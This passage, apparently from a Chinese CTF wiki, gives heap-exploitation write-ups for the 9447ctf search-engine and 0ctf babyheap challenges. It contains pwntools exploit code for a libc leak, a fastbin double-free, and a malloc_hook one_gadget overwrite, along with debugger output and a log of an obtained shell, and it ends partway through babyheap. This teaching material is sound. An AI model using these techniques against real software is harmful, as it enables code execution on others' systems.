<p>可以看出，在每次释放 i-&gt;sentence_ptr 之前，这个句子的内容就会全部被设置为 <code>\x00</code> ，由于单词结构体中存储的单词只是句子的一个指针，所以单词也会被置为 <code>\x00</code> 。该句子对应的那些单词仍然是存在于链表中的，并没有被删除，因此每次搜索单词的时候，仍然会判断。看起来由于句子内容被置为 <code>\x00</code> 可以防止通过 <code>*i-&gt;sentence_ptr</code> 验证。然而，由于 chunk 被释放后会被放到 bin 中，当 chunk 不是 fastbin 或者 chunk 被重新分配出去使用的时候，也就有可能会产生 double free 的情况。此外，当句子被 <code>memset</code> 的时候，单词虽然都变为了 <code>\x00</code> ，但是我们仍然可以通过两个 <code>\x00</code> 的比较来绕过 <code>memcmp</code> 的检测。</p>
<h3 id="_23">利用<a class="headerlink" href="#_23" title="Permanent link">&para;</a></h3>
<h4 id="_24">利用思路<a class="headerlink" href="#_24" title="Permanent link">&para;</a></h4>
<p>基本利用思路如下</p>
<ul>
<li>利用 unsorted bin 地址泄漏 libc 基地址</li>
<li>利用 double free 构造 fastbin 循环链表</li>
<li>分配 chunk 到 malloc_hook 附近，修改malloc_hook 为 one_gadget</li>
</ul>
<h4 id="libc">泄漏 libc 地址<a class="headerlink" href="#libc" title="Permanent link">&para;</a></h4>
<p>这里我们分配一个 small bin 大小的 chunk ，当它被释放后，就会放入到 unsorted bin 中。因而，只要 <code>unsorted bin</code> 的地址的起始字节不是 <code>\x00</code> 便可以通过验证。同时，我们可以构造 <code>\x00</code> 来进行比较，从而通过验证。具体如下</p>
<div class="codehilite"><pre><span></span><span class="k">def</span> <span class="nf">leak_libc</span><span class="p">():</span>
    <span class="n">smallbin_sentence</span> <span class="o">=</span> <span class="s1">&#39;s&#39;</span> <span class="o">*</span> <span class="mh">0x85</span> <span class="o">+</span> <span class="s1">&#39; m &#39;</span>
    <span class="n">index_sentence</span><span class="p">(</span><span class="n">smallbin_sentence</span><span class="p">)</span>
    <span class="n">search_word</span><span class="p">(</span><span class="s1">&#39;m&#39;</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;Delete this sentence (y/n)?</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;y&#39;</span><span class="p">)</span>
    <span class="n">search_word</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;Found &#39;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">smallbin_sentence</span><span class="p">))</span> <span class="o">+</span> <span class="s1">&#39;: &#39;</span><span class="p">)</span>
    <span class="n">unsortedbin_addr</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">8</span><span class="p">))</span>
    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;Delete this sentence (y/n)?</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;n&#39;</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">unsortedbin_addr</span>
</pre></div>

<h4 id="fastbin">构造 fastbin 循环链表<a class="headerlink" href="#fastbin" title="Permanent link">&para;</a></h4>
<p>由于我们最后希望在 malloc_hook 处分配 chunk，而一般分配 malloc_hook 附近的 chunk 一般大小都是0x7f。即，我们所需要设置的设置的 fast bin 的数据字节部分的大小为 0x60。这里我们按照如下方式构造</p>
<ol>
<li>分别索引句子a，索引句子b，索引句子c，则此时单词链表中索引的句子的相对顺序为c-&gt;b-&gt;a。假设句子 a 为'a' * 0x5d+' d '，句子 b 为 'b' * 0x5d+' d '，句子c类似。</li>
<li>索引单词d，三个均删除，则此时 fastbin 中的链表情况为 a-&gt;b-&gt;c-&gt;NULL，这是因为首先释放的是句子c，最后释放的是句子 a 。这时，搜索单词时<code>*i-&gt;sentence_ptr</code> 对于a, b 来说都是可以绕过的。</li>
<li>我们此时再次删除搜索单词 <code>\x00</code>。首先遍历的是 c，但是 c 的验证不通过；其次遍历的是b，验证通过，我们将其释放；其次遍历的是a，验证通过，但是我们不删除。则此时 fastbin 的情况为 b-&gt;a-&gt;b-&gt;a-&gt;...。即已经构成了double free b的情况。由于我们先前为了 leak libc 还建立一个句子，所以还有一个单词可以比较，这里我们也不删除。</li>
</ol>
<p>具体代码如下</p>
<div class="codehilite"><pre><span></span>    <span class="c1"># 2. create cycle fastbin 0x70 size</span>
    <span class="n">index_sentence</span><span class="p">(</span><span class="s1">&#39;a&#39;</span> <span class="o">*</span> <span class="mh">0x5d</span> <span class="o">+</span> <span class="s1">&#39; d &#39;</span><span class="p">)</span>  <span class="c1">#a</span>
    <span class="n">index_sentence</span><span class="p">(</span><span class="s1">&#39;b&#39;</span> <span class="o">*</span> <span class="mh">0x5d</span> <span class="o">+</span> <span class="s1">&#39; d &#39;</span><span class="p">)</span>  <span class="c1">#b</span>
    <span class="n">index_sentence</span><span class="p">(</span><span class="s1">&#39;c&#39;</span> <span class="o">*</span> <span class="mh">0x5d</span> <span class="o">+</span> <span class="s1">&#39; d &#39;</span><span class="p">)</span>  <span class="c1">#c</span>

    <span class="c1"># a-&gt;b-&gt;c-&gt;NULL</span>
    <span class="n">search_word</span><span class="p">(</span><span class="s1">&#39;d&#39;</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;Delete this sentence (y/n)?</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;y&#39;</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;Delete this sentence (y/n)?</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;y&#39;</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;Delete this sentence (y/n)?</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;y&#39;</span><span class="p">)</span>

    <span class="c1"># b-&gt;a-&gt;b-&gt;a-&gt;...</span>
    <span class="n">search_word</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;Delete this sentence (y/n)?</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;y&#39;</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;Delete this sentence (y/n)?</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;n&#39;</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;Delete this sentence (y/n)?</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;n&#39;</span><span class="p">)</span>
</pre></div>

<p>效果如下</p>
<div class="codehilite"><pre><span></span>pwndbg&gt; fastbins 
fastbins
0x20: 0x0
0x30: 0x1d19320 ◂— 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x1d191b0 —▸ 0x1d19010 —▸ 0x1d191b0 ◂— 0x1d19010
0x80: 0x0
</pre></div>

<h4 id="malloc_hook-chunk">分配 malloc_hook 附近chunk<a class="headerlink" href="#malloc_hook-chunk" title="Permanent link">&para;</a></h4>
<p>此时，fastbin 的链表为 b-&gt;a-&gt;b-&gt;a-&gt;…，则我们可以在申请第一个相同大小的 chunk 时，设置 b 的 fd 为 malloc_hook 附近处的 chunk <code>0x7fd798586aed</code>（这里是举一个例子，代码中需使用相对地址）。</p>
<div class="codehilite"><pre><span></span>pwndbg&gt; print <span class="o">(</span>void*<span class="o">)</span><span class="p">&amp;</span>main_arena 
<span class="nv">$1</span> <span class="o">=</span> <span class="o">(</span>void *<span class="o">)</span> 0x7fd798586b20 &lt;main_arena&gt;
pwndbg&gt; x/8gx 0x7fd798586b20-16
0x7fd798586b10 &lt;__malloc_hook&gt;: 0x0000000000000000  0x0000000000000000
0x7fd798586b20 &lt;main_arena&gt;:    0x0000000000000000  0x0000000000bce130
0x7fd798586b30 &lt;main_arena+16&gt;: 0x0000000000000000  0x0000000000000000
0x7fd798586b40 &lt;main_arena+32&gt;: 0x0000000000000000  0x0000000000000000
pwndbg&gt; find_fake_fast 0x7fd798586b10 0x7f
FAKE CHUNKS
0x7fd798586aed PREV_INUSE IS_MMAPED NON_MAIN_ARENA <span class="o">{</span>
  <span class="nv">prev_size</span> <span class="o">=</span> <span class="m">15535264025435701248</span>, 
  <span class="nv">size</span> <span class="o">=</span> <span class="m">127</span>, 
  <span class="nv">fd</span> <span class="o">=</span> 0xd798247e20000000, 
  <span class="nv">bk</span> <span class="o">=</span> 0xd798247a0000007f, 
  <span class="nv">fd_nextsize</span> <span class="o">=</span> 0x7f, 
  <span class="nv">bk_nextsize</span> <span class="o">=</span> 0x0
<span class="o">}</span>
pwndbg&gt; print /x 0x7fd798586b10-0x7fd798586aed
<span class="nv">$2</span> <span class="o">=</span> 0x23
pwndbg&gt; print /x 0x7fd798586b20-0x7fd798586aed
<span class="nv">$3</span> <span class="o">=</span> 0x33
</pre></div>

<p>那么当再次分配 b 的时候，由于此时 b 的 fd 已经被我们修改为了malloc_hook附近的地址，所以这时候我们再次分配一个 chunk，就会指向 <code>0x7fd798586aed</code>。 此后便只需要将 malloc_hook 修改为 one_gadget 地址就可以拿到 shell 了。</p>
<div class="codehilite"><pre><span></span>    <span class="c1"># 3. fastbin attack to malloc_hook nearby chunk</span>
    <span class="n">fake_chunk_addr</span> <span class="o">=</span> <span class="n">main_arena_addr</span> <span class="o">-</span> <span class="mh">0x33</span>
    <span class="n">fake_chunk</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="n">fake_chunk_addr</span><span class="p">)</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0x60</span><span class="p">,</span> <span class="s1">&#39;f&#39;</span><span class="p">)</span>

    <span class="n">index_sentence</span><span class="p">(</span><span class="n">fake_chunk</span><span class="p">)</span>

    <span class="n">index_sentence</span><span class="p">(</span><span class="s1">&#39;a&#39;</span> <span class="o">*</span> <span class="mh">0x60</span><span class="p">)</span>

    <span class="n">index_sentence</span><span class="p">(</span><span class="s1">&#39;b&#39;</span> <span class="o">*</span> <span class="mh">0x60</span><span class="p">)</span>

    <span class="n">one_gadget_addr</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0xf02a4</span>
    <span class="n">payload</span> <span class="o">=</span> <span class="s1">&#39;a&#39;</span> <span class="o">*</span> <span class="mh">0x13</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">one_gadget_addr</span><span class="p">)</span>
    <span class="n">payload</span> <span class="o">=</span> <span class="n">payload</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0x60</span><span class="p">,</span> <span class="s1">&#39;f&#39;</span><span class="p">)</span>
    <span class="c1">#gdb.attach(p)</span>
    <span class="n">index_sentence</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</pre></div>

<p>这里可能需要多选择几个 one_gadget 地址，因为 one_gadget 成功是有条件的。</p>
<h4 id="shell">shell<a class="headerlink" href="#shell" title="Permanent link">&para;</a></h4>
<div class="codehilite"><pre><span></span>➜  2015_9447ctf_search-engine git:<span class="o">(</span>master<span class="o">)</span> python exp.py
<span class="o">[</span>*<span class="o">]</span> <span class="s1">&#39;/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/heap/example/fastbin_attack/2015_9447ctf_search-engine/search&#39;</span>
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE <span class="o">(</span>0x400000<span class="o">)</span>
    FORTIFY:  Enabled
<span class="o">[</span>+<span class="o">]</span> Starting <span class="nb">local</span> process <span class="s1">&#39;./search&#39;</span>: pid <span class="m">31158</span>
<span class="o">[</span>*<span class="o">]</span> PID: <span class="m">31158</span>
<span class="o">[</span>+<span class="o">]</span> unsortedbin addr: 0x7f802e73bb78
<span class="o">[</span>+<span class="o">]</span> libc base addr: 0x7f802e377000
<span class="o">[</span>*<span class="o">]</span> Switching to interactive mode
Enter the sentence:
$ ls
exp.py       search      search.id1  search.nam
libc.so.6  search.id0  search.id2  search.til
</pre></div>

<p>当然，这里还有一种<a href="https://www.gulshansingh.com/posts/9447-ctf-2015-search-engine-writeup/">方法</a>，将 chunk 分配到栈上。</p>
<h2 id="2017-0ctf-babyheap">2017 0ctf babyheap<a class="headerlink" href="#2017-0ctf-babyheap" title="Permanent link">&para;</a></h2>
<h3 id="_25">基本信息<a class="headerlink" href="#_25" title="Permanent link">&para;</a></h3>
<div class="codehilite"><pre><span></span>➜  2017_0ctf_babyheap git:<span class="o">(</span>master<span class="o">)</span> file babyheap                            
babyheap: ELF <span class="m">64</span>-bit LSB shared object, x86-64, version <span class="m">1</span> <span class="o">(</span>SYSV<span class="o">)</span>, dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, <span class="k">for</span> GNU/Linux <span class="m">2</span>.6.32, BuildID<span class="o">[</span>sha1<span class="o">]=</span>9e5bfa980355d6158a76acacb7bda01f4e3fc1c2, stripped
➜  2017_0ctf_babyheap git:<span class="o">(</span>master<span class="o">)</span> checksec babyheap   
<span class="o">[</span>*<span class="o">]</span> <span class="s1">&#39;/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/heap/example/fastbin_attack/2017_0ctf_babyheap/babyheap&#39;</span>
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
</pre></div>

<p>64位程序，保护全部开启。</p>
<h3 id="_26">基本功能<a class="headerlink" href="#_26" title="Permanent link">&para;</a></h3>
<p>程序是一个堆分配器，主要由以下四种功能</p>
<div class="codehilite"><pre><span></span>  <span class="n">puts</span><span class="p">(</span><span class="s">&quot;1. Allocate&quot;</span><span class="p">);</span>
  <span class="n">puts</span><span class="p">(</span><span class="s">&quot;2. Fill&quot;</span><span class="p">);</span>
  <span class="n">puts</span><span class="p">(</span><span class="s">&quot;3. Free&quot;</span><span class="p">);</span>
  <span class="n">puts</span><span class="p">(</span><span class="s">&quot;4. Dump&quot;</span><span class="p">);</span>
  <span class="n">puts</span><span class="p">(</span><span class="s">&quot;5. Exit&quot;</span><span class="p">);</span>
  <span class="k">return</span> <span class="nf">printf</span><span class="p">(</span><span class="s">&quot;Command: &quot;</span><span class="p">);</span>
</pre></div>

<p>其中，每次读取命令的函数由读取指定长度的字符串的函数而决定。</p>
<p>通过分配函数</p>
<div class="codehilite"><pre><span></span><span class="kt">void</span> <span class="kr">__fastcall</span> <span class="nf">allocate</span><span class="p">(</span><span class="kr">__int64</span> <span class="n">a1</span><span class="p">)</span>
<span class="p">{</span>
  <span class="kt">signed</span> <span class="kt">int</span> <span class="n">i</span><span class="p">;</span> <span class="c1">// [rsp+10h] [rbp-10h]</span>
  <span class="kt">signed</span> <span class="kt">int</span> <span class="n">v2</span><span class="p">;</span> <span class="c1">// [rsp+14h] [rbp-Ch]</span>
  <span class="kt">void</span> <span class="o">*</span><span class="n">v3</span><span class="p">;</span> <span class="c1">// [rsp+18h] [rbp-8h]</span>

  <span class="k">for</span> <span class="p">(</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;=</span> <span class="mi">15</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span> <span class="p">)</span>
  <span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span> <span class="o">!*</span><span class="p">(</span><span class="n">_DWORD</span> <span class="o">*</span><span class="p">)(</span><span class="mi">24LL</span> <span class="o">*</span> <span class="n">i</span> <span class="o">+</span> <span class="n">a1</span><span class="p">)</span> <span class="p">)</span>
    <span class="p">{</span>
      <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Size: &quot;</span><span class="p">);</span>
      <span class="n">v2</span> <span class="o">=</span> <span class="n">read_num</span><span class="p">();</span>
      <span class="k">if</span> <span class="p">(</span> <span class="n">v2</span> <span class="o">&gt;</span> <span class="mi">0</span> <span class="p">)</span>
      <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span> <span class="n">v2</span> <span class="o">&gt;</span> <span class="mi">4096</span> <span class="p">)</span>
          <span class="n">v2</span> <span class="o">=</span> <span class="mi">4096</span><span class="p">;</span>
        <span class="n">v3</span> <span class="o">=</span> <span class="n">calloc</span><span class="p">(</span><span class="n">v2</span><span class="p">,</span> <span class="mi">1uLL</span><span class="p">);</span>
        <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">v3</span> <span class="p">)</span>
          <span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
        <span class="o">*</span><span class="p">(</span><span class="n">_DWORD</span> <span class="o">*</span><span class="p">)(</span><span class="mi">24LL</span> <span class="o">*</span> <span class="n">i</span> <span class="o">+</span> <span class="n">a1</span><span class="p">)</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
        <span class="o">*</span><span class="p">(</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)(</span><span class="n">a1</span> <span class="o">+</span> <span class="mi">24LL</span> <span class="o">*</span> <span class="n">i</span> <span class="o">+</span> <span class="mi">8</span><span class="p">)</span> <span class="o">=</span> <span class="n">v2</span><span class="p">;</span>
        <span class="o">*</span><span class="p">(</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)(</span><span class="n">a1</span> <span class="o">+</span> <span class="mi">24LL</span> <span class="o">*</span> <span class="n">i</span> <span class="o">+</span> <span class="mi">16</span><span class="p">)</span> <span class="o">=</span> <span class="n">v3</span><span class="p">;</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Allocate Index %d</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span><span class="p">)</span><span class="n">i</span><span class="p">);</span>
      <span class="p">}</span>
      <span class="k">return</span><span class="p">;</span>
    <span class="p">}</span>
  <span class="p">}</span>
<span class="p">}</span>
</pre></div>

<p>申请的 chunk 的最大为 4096。此外，我们可以看出每个 chunk 主要有三个字段：是否在使用，堆块大小，堆块位置。故而我们可以创建对应的结构体。</p>
<div class="codehilite"><pre><span></span>00000000 chunk           struc ; (sizeof=0x18, mappedto_6)
00000000 inuse           dq ?
00000008 size            dq ?
00000010 ptr             dq ?
00000018 chunk           ends
</pre></div>

<p><strong>需要注意的是堆块是由 calloc 分配的，所以 chunk 中的内容全都为<code>\x00</code>。</strong></p>
<p>在填充内容的功能中，使用读取内容的函数是直接读取指定长度的内容，并没有设置字符串结尾。<strong>而且比较有意思的是，这个指定长度是我们指定的，并不是之前 chunk 分配时指定的长度，所以这里就出现了任意堆溢出的情形。</strong></p>
<div class="codehilite"><pre><span></span><span class="kr">__int64</span> <span class="kr">__fastcall</span> <span class="nf">fill</span><span class="p">(</span><span class="n">chunk</span> <span class="o">*</span><span class="n">a1</span><span class="p">)</span>
<span class="p">{</span>
  <span class="kr">__int64</span> <span class="n">result</span><span class="p">;</span> <span class="c1">// rax</span>
  <span class="kt">int</span> <span class="n">v2</span><span class="p">;</span> <span class="c1">// [rsp+18h] [rbp-8h]</span>
  <span class="kt">int</span> <span class="n">v3</span><span class="p">;</span> <span class="c1">// [rsp+1Ch] [rbp-4h]</span>

  <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Index: &quot;</span><span class="p">);</span>
  <span class="n">result</span> <span class="o">=</span> <span class="n">read_num</span><span class="p">();</span>
  <span class="n">v2</span> <span class="o">=</span> <span class="n">result</span><span class="p">;</span>
  <span class="k">if</span> <span class="p">(</span> <span class="p">(</span><span class="kt">signed</span> <span class="kt">int</span><span class="p">)</span><span class="n">result</span> <span class="o">&gt;=</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="kt">signed</span> <span class="kt">int</span><span class="p">)</span><span class="n">result</span> <span class="o">&lt;=</span> <span class="mi">15</span> <span class="p">)</span>
  <span class="p">{</span>
    <span class="n">result</span> <span class="o">=</span> <span class="n">LODWORD</span><span class="p">(</span><span class="n">a1</span><span class="p">[(</span><span class="kt">signed</span> <span class="kt">int</span><span class="p">)</span><span class="n">result</span><span class="p">].</span><span class="n">inuse</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span> <span class="p">(</span><span class="n">_DWORD</span><span class="p">)</span><span class="n">result</span> <span class="o">==</span> <span class="mi">1</span> <span class="p">)</span>
    <span class="p">{</span>
      <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Size: &quot;</span><span class="p">);</span>
      <span class="n">result</span> <span class="o">=</span> <span class="n">read_num</span><span class="p">();</span>
      <span class="n">v3</span> <span class="o">=</span> <span class="n">result</span><span class="p">;</span>
      <span class="k">if</span> <span class="p">(</span> <span class="p">(</span><span class="kt">signed</span> <span class="kt">int</span><span class="p">)</span><span class="n">result</span> <span class="o">&gt;</span> <span class="mi">0</span> <span class="p">)</span>
      <span class="p">{</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Content: &quot;</span><span class="p">);</span>
        <span class="n">result</span> <span class="o">=</span> <span class="n">read_content</span><span class="p">((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">a1</span><span class="p">[</span><span class="n">v2</span><span class="p">].</span><span class="n">ptr</span><span class="p">,</span> <span class="n">v3</span><span class="p">);</span>
      <span class="p">}</span>
    <span class="p">}</span>
  <span class="p">}</span>
  <span class="k">return</span> <span class="n">result</span><span class="p">;</span>
<span class="p">}</span>
</pre></div>

<p>在释放chunk的功能中该设置的都设置了。</p>
<div class="codehilite"><pre><span></span><span class="kr">__int64</span> <span class="kr">__fastcall</span> <span class="nf">free_chunk</span><span class="p">(</span><span class="n">chunk</span> <span class="o">*</span><span class="n">a1</span><span class="p">)</span>
<span class="p">{</span>
  <span class="kr">__int64</span> <span class="n">result</span><span class="p">;</span> <span class="c1">// rax</span>
  <span class="kt">int</span> <span class="n">v2</span><span class="p">;</span> <span class="c1">// [rsp+1Ch] [rbp-4h]</span>

  <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Index: &quot;</span><span class="p">);</span>
  <span class="n">result</span> <span class="o">=</span> <span class="n">read_num</span><span class="p">();</span>
  <span class="n">v2</span> <span class="o">=</span> <span class="n">result</span><span class="p">;</span>
  <span class="k">if</span> <span class="p">(</span> <span class="p">(</span><span class="kt">signed</span> <span class="kt">int</span><span class="p">)</span><span class="n">result</span> <span class="o">&gt;=</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="kt">signed</span> <span class="kt">int</span><span class="p">)</span><span class="n">result</span> <span class="o">&lt;=</span> <span class="mi">15</span> <span class="p">)</span>
  <span class="p">{</span>
    <span class="n">result</span> <span class="o">=</span> <span class="n">LODWORD</span><span class="p">(</span><span class="n">a1</span><span class="p">[(</span><span class="kt">signed</span> <span class="kt">int</span><span class="p">)</span><span class="n">result</span><span class="p">].</span><span class="n">inuse</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span> <span class="p">(</span><span class="n">_DWORD</span><span class="p">)</span><span class="n">result</span> <span class="o">==</span> <span class="mi">1</span> <span class="p">)</span>
    <span class="p">{</span>
      <span class="n">LODWORD</span><span class="p">(</span><span class="n">a1</span><span class="p">[</span><span class="n">v2</span><span class="p">].</span><span class="n">inuse</span><span class="p">)</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
      <span class="n">a1</span><span class="p">[</span><span class="n">v2</span><span class="p">].</span><span class="n">size</span> <span class="o">=</span> <span class="mi">0LL</span><span class="p">;</span>
      <span class="n">free</span><span class="p">(</span><span class="n">a1</span><span class="p">[</span><span class="n">v2</span><span class="p">].</span><span class="n">ptr</span><span class="p">);</span>
      <span class="n">result</span> <span class="o">=</span> <span class="p">(</span><span class="kr">__int64</span><span class="p">)</span><span class="o">&amp;</span><span class="n">a1</span><span class="p">[</span><span class="n">v2</span><span class="p">];</span>
      <span class="o">*</span><span class="p">(</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)(</span><span class="n">result</span> <span class="o">+</span> <span class="mi">16</span><span class="p">)</span> <span class="o">=</span> <span class="mi">0LL</span><span class="p">;</span>
    <span class="p">}</span>
  <span class="p">}</span>
  <span class="k">return</span> <span class="n">result</span><span class="p">;</span>
<span class="p">}</span>
</pre></div>

<p>dump 就是输出对应索引 chunk 的内容。</p>
<h3 id="_27">利用思路<a class="headerlink" href="#_27" title="Permanent link">&para;</a></h3>
<p>可以确定的是，我们主要有的漏洞就是任意长度堆溢出。由于该程序几乎所有保护都开启了，所以我们必须要有一些泄漏才可以控制程序的流程。基本利用思路如下</p>
<ul>
<li>利用 unsorted bin 地址泄漏 libc 基地址。</li>
<li>利用 fastbin attack 将chunk 分配到 malloc_hook 附近。</li>
</ul>
<h4 id="libc_1">泄漏 libc 基地址<a class="headerlink" href="#libc_1" title="Permanent link">&para;</a></h4>
<p>由于我们是希望使用 unsorted bin 来泄漏 libc 基地址，所以必须要有 chunk 可以被链接到 unsorted bin 中，所以该 chunk 不能使 fastbin chunk，也不能和 top chunk 相邻。因为前者会被添加到 fastbin 中，后者在不是fastbin 的情况下，会被合并到 top chunk 中。因此，我们这里构造一个 small bin chunk。在将该 chunk 释放到 unsorted bin 的同时，也需要让另外一个正在使用的 chunk 可以同时指向该 chunk 的位置。这样才可以进行泄漏。具体设计如下</p>
<div class="codehilite"><pre><span></span>    <span class="c1"># 1. leak libc base</span>
    <span class="n">allocate</span><span class="p">(</span><span class="mh">0x10</span><span class="p">)</span>  <span class="c1"># idx 0, 0x00</span>
    <span class="n">allocate</span><span class="p">(</span><span class="mh">0x10</span><span class="p">)</span>  <span class="c1"># idx 1, 0x20</span>
    <span class="n">allocate</span><span class="p">(</span><span class="mh">0x10</span><span class="p">)</span>  <span class="c1"># idx 2, 0x40</span>
    <span class="n">allocate</span><span class="p">(</span><span class="mh">0x10</span><span class="p">)</span>  <span class="c1"># idx 3, 0x60</span>
    <span class="n">allocate</span><span class="p">(</span><span class="mh">0x80</span><span class="p">)</span>  <span class="c1"># idx 4, 0x80</span>
    <span class="c1"># free idx 1, 2, fastbin[0]-&gt;idx1-&gt;idx2-&gt;NULL</span>
    <span class="n">free</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
    <span class="n">free</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
</pre></div>

<p>首先，我们申请了 5 个chunk，并释放了两个chunk，此时堆的情况如下。</p>
<div class="codehilite"><pre><span></span>pwndbg&gt; x/20gx 0x55a03ca22000
0x55a03ca22000: 0x0000000000000000  0x0000000000000021 idx <span class="m">0</span>
0x55a03ca22010: 0x0000000000000000  0x0000000000000000
0x55a03ca22020: 0x0000000000000000  0x0000000000000021 idx <span class="m">1</span>
0x55a03ca22030: 0x000055a03ca22040  0x0000000000000000
0x55a03ca22040: 0x0000000000000000  0x0000000000000021 idx <span class="m">2</span>
0x55a03ca22050: 0x0000000000000000  0x0000000000000000
0x55a03ca22060: 0x0000000000000000  0x0000000000000021 idx <span class="m">3</span>
0x55a03ca22070: 0x0000000000000000  0x0000000000000000
0x55a03ca22080: 0x0000000000000000  0x0000000000000091 idx <span class="m">4</span>
0x55a03ca22090: 0x0000000000000000  0x0000000000000000
pwndbg&gt; fastbins 
fastbins
0x20: 0x55a03ca22020 —▸ 0x55a03ca22040 ◂— 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
</pre></div>

<p>当我们编辑 idx0 后，确实已经将其指向idx4了。这里之所以可以成功是因为堆的始终是 4KB 对齐的，所以idx 4的起始地址的第一个字节必然是0x80。</p>
<div class="codehilite"><pre><span></span>    <span class="c1"># edit idx 0 chunk to particial overwrite idx1&#39;s fd to point to idx4</span>
    <span class="n">payload</span> <span class="o">=</span> <span class="mh">0x10</span> <span class="o">*</span> <span class="s1">&#39;a&#39;</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x21</span><span class="p">)</span> <span class="o">+</span> <span class="n">p8</span><span class="p">(</span><span class="mh">0x80</span><span class="p">)</span>
    <span class="n">fill</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">),</span> <span class="n">payload</span><span class="p">)</span>
</pre></div>

